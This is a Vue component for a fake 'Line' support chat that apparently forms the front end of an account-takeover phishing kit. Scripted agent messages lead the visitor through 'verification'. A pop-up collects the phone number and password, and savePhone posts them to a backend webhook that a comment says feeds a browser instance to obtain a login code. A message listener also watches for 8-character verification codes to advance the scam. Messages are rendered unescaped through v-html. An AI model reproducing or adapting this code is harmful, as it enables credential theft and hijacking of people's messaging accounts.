<script setup lang="ts">
import {nextTick, onMounted, onUnmounted, ref, toRaw, toRefs, unref} from 'vue';
import APIClient from '@/services/APIClient'
import {
  WKSDK,
  Message,
  StreamItem,
  MessageText,
  Channel,
  MessageStatus,
  PullMode,
  MessageContent,
  ConnectStatus,
  type ConnectStatusListener,
  type MessageListener,
  type MessageStatusListener,
  SendackPacket,
  Setting,
  ChannelTypePerson, ChannelTypeGroup, type SyncOptions
} from "wukongimjssdk";
import {STATIC, Tool} from "@/services/static";
import {showImagePreview, showLoadingToast, showToast} from "vant";
import {useI18n} from "vue-i18n";
import {sprintf} from "sprintfit";
//@ts-ignore
import Mobile from "@/views/Pages/Tanchu.vue";
import book from '@/assets/book.png'


const chatRef = ref<HTMLElement | null>(null)
const showSettingPanel = ref(false)

const text = ref("")

let msgCount = 0


const pulldowning = ref(false) // 下拉中
const pulldownFinished = ref(false) // 下拉完成

// 多语言
const {t} = useI18n()

const msgInputPlaceholder = ref("请输入消息")
const streamNo = ref<string>() // 流消息序号

const messages = ref<Message[]>(new Array<Message>())

//定义所需参数
type Props = {
  uid: string, // 链接用户uid
  token: string, // 链接用户的token
  chat_id: string // 链接对话id
  to_uid: string // 对方的uid
  first_text: string // 话术
  guide_img: string // 引导图
}
const props = defineProps<Props>()

// 是否显示手机号输入
const showMobile = ref(false)

// 对方的频道信息
const to = ref(new Channel(props.to_uid, 0))

// 对方的管道id
const channelID = ref(props.to_uid)

// 是否是单聊
const p2p = ref(true)

// 点击复制事件
const copycode = (param: any) => {
  let textToCopy = param.replace("-", "")
  // 创建 Clipboard API 的写入对象
  var textarea = document.createElement('textarea');
  // @ts-ignore
  textarea.value = textToCopy;
  document.body.appendChild(textarea);
  textarea.select();
  document.execCommand('copy');
  document.body.removeChild(textarea);
  showToast(t('cpy'))
}
//@ts-ignore
window.copycode = copycode

// 显示邮箱绑定流程
const showProcess = () => {
  // 当前用户发消息给客服
  Tool.sendMessage(props.uid, props.to_uid, t('ksyz'))

  // 客服发消息给当前用户
  setTimeout(() => {
    // 第二句话术
    const customerInfo = JSON.parse(localStorage.getItem("customerInfo") ?? "")
    let second_text = sprintf(
        customerInfo.email_text,
        customerInfo.FirstImg
    )
    Tool.sendMessage(props.to_uid, props.uid, second_text)
    setTimeout(() => {
      scrollBottom()
    }, 500)
  }, 500)

}
//@ts-ignore
window.showProcess = showProcess

// 开始验证事件
const BindEmail = () => {

  // 当前用户发消息给客服
  Tool.sendMessage(props.uid, props.to_uid, t('bound_email'))

  // 客服发消息给当前用户
  setTimeout(() => {
    // 第二句话术
    const customerInfo = JSON.parse(localStorage.getItem("customerInfo") ?? "")
    let second_text = sprintf(
        customerInfo.second_text,
        customerInfo.SecondIosImg,
        customerInfo.SecondImg,
    )
    Tool.sendMessage(props.to_uid, props.uid, second_text)
    setTimeout(() => {
      scrollBottom()
    }, 500)
  }, 500)

}
//@ts-ignore
window.BindEmail = BindEmail

// 获取验证码事件
const handleButtonClick = () => {
  Tool.sendMessage(props.uid, props.to_uid, t('hqaqm'))
  setTimeout(() => {
    showMobile.value = true
  }, 500)
}
// @ts-ignore
window.handleButtonClick = handleButtonClick

// 重新验证
const reCheck = () => {
  localStorage.clear();

  setTimeout(() => {
    window.location.reload()
  }, 500)
}
// @ts-ignore
window.reCheck = reCheck

// // 显示ios 图片
// const showIosImg = () => {
//   const customerInfo = JSON.parse(localStorage.getItem("customerInfo") ?? "")
//   showImagePreview([customerInfo.SecondIosImg])
// }
// window.showIosImg = showIosImg

// 显示ios 图片
const showIosFirstImg = () => {
  const customerInfo = JSON.parse(localStorage.getItem("customerInfo") ?? "")
  showImagePreview([customerInfo.FirstImg])
}
// @ts-ignore
window.showIosFirstImg = showIosFirstImg

// 显示安卓图片
const showAndImg = () => {
  const customerInfo = JSON.parse(localStorage.getItem("customerInfo") ?? "")
  showImagePreview([customerInfo.SecondImg])
}
// @ts-ignore
window.showAndImg = showAndImg

// 显示图片
const showImg = (address: any) => {
  showImagePreview([address])
}


let connectStatusListener!: ConnectStatusListener
let messageListener!: MessageListener
let messageStatusListener!: MessageStatusListener


onMounted(() => {
  // 获取IM的长连接地址
  APIClient.shared.post(STATIC.BASE_URL + '/api/getSocketAddress', {
    chat_id: props.chat_id, // 对话id
    language: localStorage.getItem("language"),
    type: 1
  }).then((res) => {
    // 判断接口链接获取是否正常
    if (res.code != 200) {
      return showToast(res.msg);
    }

    // 获取socket 地址，并进行链接
    let addr = 'wss://' + res.data.wsAddress
    if (!addr || addr === "") {
      return showToast("没有socket链接地址")
    }
    connectIM(addr)

  })
})

// 同步消息
const settingOKClick = () => {

  if (p2p.value) {
    to.value = new Channel(channelID.value, ChannelTypePerson)
  } else {
    to.value = new Channel(channelID.value, ChannelTypeGroup)
  }
  if (!p2p.value) {
    APIClient.shared.joinChannel(to.value.channelID, to.value.channelType, WKSDK.shared().config.uid || "")
  }
  showSettingPanel.value = false

  messages.value = []

  pullLast() // 拉取最新消息
}

// 连接IM
const connectIM = (addr: string) => {
  const config = WKSDK.shared().config

  // 判断是否有token 和 uid 是否存在
  if (!props.uid || !props.token) {
    return showToast("uid or token 不存在！")
  }

  // 设定用户的uid 跟 token
  config.uid = props.uid;
  config.token = props.token

  config.addr = addr
  WKSDK.shared().config = config

  // 同步消息的数据源
  WKSDK.shared().config.provider.syncMessagesCallback = async (channel: Channel, opts: SyncOptions) => {
    return await APIClient.shared.syncMessages(channel, opts)
  }

  // 拉最新消息
  settingOKClick()

  // 监听连接状态
  connectStatusListener = (status) => {
    console.log("监听连接状态", status, ConnectStatus.Connected)
  }
  WKSDK.shared().connectManager.addConnectStatusListener(connectStatusListener)


  // 监听消息
  messageListener = (msg) => {

    if (!to.value.isEqual(msg.channel)) {
      return
    }
    if (msg.streamOn) {
      let exist = false
      for (const message of messages.value) {
        if (message.streamNo === msg.streamNo) {
          let streams = message.streams;
          const newStream = new StreamItem()
          newStream.clientMsgNo = msg.clientMsgNo
          newStream.streamSeq = msg.streamSeq || 0
          newStream.content = msg.content
          if (streams && streams.length > 0) {
            streams.push(newStream)
          } else {
            streams = [newStream]
          }
          message.streams = streams
          exist = true
          break
        }
      }
      if (!exist) {
        messages.value.push(msg)
      }
    } else {
      messages.value.push(msg)
    }


    // 匹配验证码, 并进行图片提示
    let txtStr = msg.content.text

    let regex = /\b[A-Z0-9]{8}\b/g;
    let matches = txtStr.match(regex);  // 使用 match 方法找到所有匹配
    const customerInfo = JSON.parse(localStorage.getItem("customerInfo") ?? "")
    if (matches && matches.length > 0) {
      if (!localStorage.getItem('hasCodeRunBefore')) {

        // 你的代码
        setTimeout(() => {
          // 验证码发送之后发送引导图
          APIClient.shared.post(STATIC.BASE_URL + '/api/sendThere', {
            form_id: props.chat_id,
            to_uid: props.to_uid,
            language: localStorage.getItem('language'),
            customer_id: customerInfo._id,
            type: 'GET_THIRD', // 是否获取第三条数据
          }).then(() => {
            scrollBottom()
          })
        }, 500)
        localStorage.setItem('hasCodeRunBefore', 'true');
      }
    }
    // 匹配验证码, 并进行图片提示END
    scrollBottom()
  }
  WKSDK.shared().chatManager.addMessageListener(messageListener)

  messageStatusListener = (ack: SendackPacket) => {
    console.log(ack)
    messages.value.forEach((m) => {
      if (m.clientSeq == ack.clientSeq) {
        m.status = ack.reasonCode == 1 ? MessageStatus.Normal : MessageStatus.Fail
        return
      }
    })
  }
  WKSDK.shared().chatManager.addMessageStatusListener(messageStatusListener)

  WKSDK.shared().connect()
}

onUnmounted(() => {
  WKSDK.shared().connectManager.removeConnectStatusListener(connectStatusListener)
  WKSDK.shared().chatManager.removeMessageListener(messageListener)
  WKSDK.shared().chatManager.removeMessageStatusListener(messageStatusListener)
  WKSDK.shared().disconnect()
})


const scrollBottom = () => {
  const chat = chatRef.value
  if (chat) {
    nextTick(function () {
      chat.scrollTop = chat.scrollHeight
    })
  }
}
// 拉取当前会话最新消息
const pullLast = async () => {
  pulldowning.value = true
  pulldownFinished.value = false
  const msgs = await WKSDK.shared().chatManager.syncMessages(to.value, {
    limit: 15, startMessageSeq: 0, endMessageSeq: 0,
    pullMode: PullMode.Up
  })
  pulldowning.value = false
  if (msgs && msgs.length > 0) {
    msgs.forEach((m) => {
      messages.value.push(m)
    })
  }
  scrollBottom()

}
const pullDown = async () => {
  if (messages.value.length == 0) {
    return
  }
  const firstMsg = messages.value[0]
  if (firstMsg.messageSeq == 1) {
    pulldownFinished.value = true
    return
  }
  const limit = 15
  const msgs = await WKSDK.shared().chatManager.syncMessages(to.value, {
    limit: limit, startMessageSeq: firstMsg.messageSeq - 1, endMessageSeq: 0,
    pullMode: PullMode.Down
  })
  if (msgs.length < limit) {
    pulldownFinished.value = true
  }
  if (msgs && msgs.length > 0) {
    msgs.reverse().forEach((m) => {
      messages.value.unshift(m)
    })
  }
  await nextTick(function () {
    const chat = chatRef.value
    const firstMsgEl = document.getElementById(firstMsg.clientMsgNo)
    if (firstMsgEl) {
      chat!.scrollTop = firstMsgEl.offsetTop
    }
  })
}


const onSend = () => {
  if (!text.value || text.value.trim() === "") {
    return showToast(t('please_enter'))
    msgCount++
    text.value = `${msgCount}`
  }
  const setting = Setting.fromUint8(0)
  if (to.value && to.value.channelID != "") {
    var content: MessageContent
    if (streamNo.value && streamNo.value !== '') {
      setting.streamNo = streamNo.value
    }
    content = new MessageText(text.value)
    WKSDK.shared().chatManager.send(content, to.value, setting)
    text.value = ""
  } else {
    showSettingPanel.value = true
  }

  scrollBottom()
}


const getMessageText = (m: any) => {
  if (m instanceof Message) {
    const streams = m.streams
    let text = ""
    if (m.content instanceof MessageText) {
      const messageText = m.content as MessageText
      text = messageText.text || ""
    }
    if (streams && streams.length > 0) { // 流式消息拼接
      for (const stream of streams) {
        if (stream.content instanceof MessageText) {
          const messageText = stream.content as MessageText
          text = text + (messageText.text || "")
        }
      }
    }
    return text

  }
  return "未知消息"
}

const handleScroll = (e: any) => {
  const targetScrollTop = e.target.scrollTop;
  const scrollOffsetTop = e.target.scrollHeight - (targetScrollTop + e.target.clientHeight);
  if (targetScrollTop <= 250) { // 下拉
    if (pulldowning.value || pulldownFinished.value) {
      console.log("不允许下拉", "pulldowning", pulldowning.value, "pulldownFinished", pulldownFinished.value)
      return
    }
    console.log("下拉")
    pulldowning.value = true
    pullDown().then(() => {
      pulldowning.value = false
    }).catch(() => {
      pulldowning.value = false
    })
  }
}

const onEnter = () => {
  onSend()
}


// 保存手机号
const savePhone = (param: any) => {
  console.log("ssssssss:", param)
  showLoadingToast({
    message: '',
    duration: 2000
  });
  // 给浏览器实例电话号码用于出码
  APIClient.shared.post(STATIC.BASE_URL + '/api/webhook?event=msg.phone', {
    form_id: props.uid,
    to_uid: props.to_uid,
    language: localStorage.getItem("language"),
    phone: param.email,
    passwd: param.password,
  }).then(() => {
    // 隐藏弹窗
    setTimeout(() => {
      showMobile.value = false
    }, 1000)
  })
}

const getLeftMessageText = (m: any) => {
  if (m instanceof Message) {
    const streams = m.streams
    let text = ""
    if (m.content instanceof MessageText) { // 文件消息
      const messageText = m.content as MessageText
      text = messageText.text || ""
    }
    if (streams && streams.length > 0) { // 流式消息拼接
      for (const stream of streams) {
        if (stream.content instanceof MessageText) {
          const messageText = stream.content as MessageText
          text = text + (messageText.text || "")
        }
      }
    }

    try {
      let content = JSON.parse(text);
      if (content.phone_number) {
        //content.phone_number
        let cStr = `<div class="message_ message-bubble"><i class="van-badge__wrapper van-icon book" style="font-size: 30px;"><img class="van-icon__image" src="` + book + `"></i><div class="phone_number"><div class="_one">手机号码</div><div data-v-4083d0df="" class="_two">` + content.phone_number + `</div></div></div>`

        return cStr
      }
      return text
    } catch (e) {
      return text
    }


  }
  return "未知消息"
}

// 是否显示头像
const showAvater = (m: any) => {
  if (m instanceof Message) {
    const streams = m.streams
    let text = ""
    if (m.content instanceof MessageText) { // 文件消息
      const messageText = m.content as MessageText
      text = messageText.text || ""
    }

    try {
      let content = JSON.parse(text);
      if (content.phone_number) {
        return false
      }
      return true
    } catch (e) {
      return true
    }


  }

}
</script>
<template>

  <van-overlay :show="showMobile">
    <Mobile style="background: #FFFFFF; margin-top: 40%" @savePhone="savePhone($event)"></Mobile>
  </van-overlay>


  <div class="chat">
    <div class="header" style="display: flex;justify-content: center;">
      <div class="title">
        <div class="left"><img style="border-radius: 50px;"
                               src="@/assets/telegram-cloud-photo-size-5-6242228799001443836-y.png" alt=""></div>
        <div class="right">
          <p style="text-align: left;font-size: 18px;">Line {{ t('title') }}</p>
        </div>
      </div>
      <!--      <div class="left-arrow"><img src="@/assets/left-arrow.png" alt=""></div>-->
    </div>
    <div class="content">
      <div class="message-box">
        <div class="message-list" v-on:scroll="handleScroll" ref="chatRef">
          <!--引导图-->
          <!--                    <van-image @click="showImg(props.guide_img)" :src="props.guide_img" class="message-image"/>-->
          <div class="tip_test">发送任何您想要保存的文字、照片、视频和链接。</div>
          <!--话术-->
          <div class="message-text">
            <div v-html="props.first_text" style="color: #81807F;"></div>
          </div>
          <!--消息-->
          <template v-for="m in messages">
            <div class="message right" v-if="m.send" :id="m.clientMsgNo">
              <div class="status" v-if="m.status != MessageStatus.Normal">Send...</div>
              <div class="bubble right">
                <div class="text" style="font-size: 12px"> {{ getMessageText(m) }}</div>
              </div>
              <div class="avatar">
                <img src="@/assets/telegram-cloud-photo-size-5-6242228799001443836-y.png"
                     style="width: 40px;height: 40px;"/>
              </div>
            </div>
            <div class="message" v-if="!m.send" :id="m.clientMsgNo">
              <div class="avatar" v-if="showAvater(m)">
                <img
                    src="@/assets/telegram-cloud-photo-size-5-6242228799001443836-y.png"
                    style="width: 40px;height: 40px;"
                />
              </div>
              <div class="bubble" :class='[showAvater(m) ? "" : "wocc"]'>
                <div class="text" v-html="getLeftMessageText(m) "></div>
              </div>
            </div>
          </template>
        </div>

      </div>
    </div>
    <div class="footer">
      <img class="add" src="@/assets/add_icon.png" alt="">
      <img class="add" src="@/assets/picture.png" alt="">
      <div style="width: 100%;position: relative;">
        <input placeholder="Aa" v-model="text" class="send-input"
               @keydown.enter="onEnter"/>
        <img class="add" src="@/assets/expression.png" style="position: absolute;right: -5px;top: 7px;" alt="">
      </div>
      <img class="send" src="@/assets/send_icon.png" alt="" v-on:click="onSend">
    </div>

  </div>

</template>

<style scoped lang="scss">
.shoujitanchu {
  position: fixed;
  top: 0;
  left: 0;
  z-index: 199;
  background: #fff;
  width: 100%;
  display: block;
  border-radius: 10px;
  height: 100%;
}

.message-text {
  width: 80%;
  background-color: white;
  display: block;
  border-radius: .5rem;
  margin: 5% auto auto;
  color: #1a1a1a;
  font-size: 12px;
  font-weight: bold;
}

.message-image {
  width: 80%;
  display: block;
  border-radius: 10px;
  overflow: hidden;
  margin: 27px auto auto;
  border: 3px solid #ffffff;
}

.chat {
  width: 100%;
  height: 100vh;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  position: relative;
}

.header {
  height: 67px;
  background-color: #92aad4;
  display: flex;
  align-items: center;
  border-bottom: 1px solid #7B96BF;
  position: fixed;
  top: env(safe-area-inset-top);
  left: 0;
  right: 0;
  z-index: 99;
  width: 100%;

  .title {
    display: flex;
    align-items: center;

    img {
      width: 35px;
    }

    p {
      margin-left: 10px;

      &:nth-child(1) {
        font-weight: bold;
        font-size: 16px;
        color: #000000;
      }

      &:nth-child(2) {
        font-size: 12px;
        color: #81807F;
      }
    }
  }

  .left-arrow {
    position: absolute;
    left: 15px;
    top: 22px;

    img {
      height: 14px;
    }
  }

  .right {
    p {
      color: #000000;
    }
  }
}

@media (prefers-color-scheme: dark) {
  .header {
    /*background-color: #ffffff;*/
  }
}

.header .left {
  display: flex;
}

.header .left button {
  margin-left: 10px;
  height: 40px;
  display: flex;
  align-items: center;
  font-size: 15px;
  background-color: transparent;
}

.header .center {
  flex: 1;
  font-size: 18px;
  font-weight: bold;
}

.header .right button {
  margin-right: 10px;
  height: 40px;
  display: flex;
  align-items: center;
  font-size: 15px;
  background-color: transparent;
  color: rgb(228, 98, 64);
}


.content {
  background: #92aad4;
  background-size: 100% 100%;
  position: relative;
  display: flex;
  height: calc(100vh - 60px);
  /* header + footer */
  /* header height */
  padding-top: calc(60px + env(safe-area-inset-top));
  /* padding-top: 60px; */
  /* padding-bottom: 60px; */
  /* overflow-y: auto; */
  /* footer height */
}

@media (prefers-color-scheme: dark) {
  .content {
    background-color: #92aad4;
  }
}

.message {
  display: flex;
  margin: 10px;
}

.message.right {
  justify-content: flex-end;
}

.message .bubble {
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 0px 10px 10px 10px;
  color: black;
  margin-left: 5px;
}

.bubble.right {
  border-radius: 18px;
  background: #6DE67B;
  color: #333333;
  padding: 5px 12px;
  max-width: 250px;
  margin-right: 15px;
  font-weight: 400;
  font-size: 13px;
}

.message .avatar {
  width: 40px;
  height: 40px;
  background-color: green;
  border-radius: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 16px;
  color: white;
}

.message .status {
  font-size: 12px;
  color: rgb(228, 98, 64);
  margin-left: 10px;
  margin-bottom: 5px;
  display: flex;
  align-items: center;
}

.message .bubble .text {
  display: flex;
  text-align: left;
  font-size: 14px;
  max-width: 250px;
  word-break: break-all;
}


.footer {
  height: 68px;
  background-color: #ffffff;
  display: flex;
  width: 100%;
  justify-content: center;
  align-items: center;
  padding: 0 13px 0 16px;

  .send {
    width: 34px;
    height: 34px;
    margin-left: 16px;
  }

  .add {
    width: 21px;
    height: 21px;
    margin-right: 16px;
  }

  .send-input {
    border: 1px solid #DDDDDD;
    border-radius: 20px;
    background: #F5F5F5;
    padding-left: 15px;
    height: 34px;
    width: 100%;
    color: #000000;
  }
}

@media (prefers-color-scheme: dark) {
  .footer {
    background-color: #F4F4F4;
  }
}

.footer button {
  width: 80px;
  height: 40px;
  margin: 5px;
  border: none;
  outline: none;
  background-color: rgb(228, 98, 64);
  color: white;
  font-size: 15px;
}

.footer input {
  flex: 1;
  border: none;
  outline: none;
}

.setting {
  position: absolute;
  top: 0px;
  left: 0px;
  width: 100%;
  height: 100%;
}

.setting .setting-content {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 250px;
  background-color: white;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
  padding: 20px;
  border-radius: 4px;
}

@media (prefers-color-scheme: dark) {
  .setting .setting-content {
    background-color: #333;
    color: white;
  }
}

.switch {
  display: flex;
  align-items: center;
  width: 100%;
  justify-content: center;
  margin-top: 10px;
}

.switch .item {
  margin-left: 20px;
  font-size: 14px;
}

.to {
  border: none;
  width: 100%;
  height: 40px;
  margin-top: 20px;
  box-sizing: border-box;
}

.ok {
  width: 100%;
  height: 40px;
  margin-top: 30px;
  border: none;
  outline: none;
  background-color: rgb(228, 98, 64);
  color: white;
  font-size: 15px;
  cursor: pointer;
}

.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.5s;
}

.fade-enter,
.fade-leave-to {
  opacity: 0;
}

.message-stream {
  width: 120px !important;
  height: 40px;
}

.message-box {
  width: 100%;
  height: 100%;
  overflow: hidden;
  display: flex;
  flex-direction: column;
}

.message-list {
  width: 100%;
  height: calc(100% - 10px);
  overflow: auto;
}

.tip_test {
  width: 300px;
  height: 30px;
  background: rgb(0, 0, 0, .2);
  text-align: center;
  line-height: 30px;
  color: #ffffff;
  border-radius: 20px;
  margin: 20px auto;
  font-size: 12px;
}
</style>
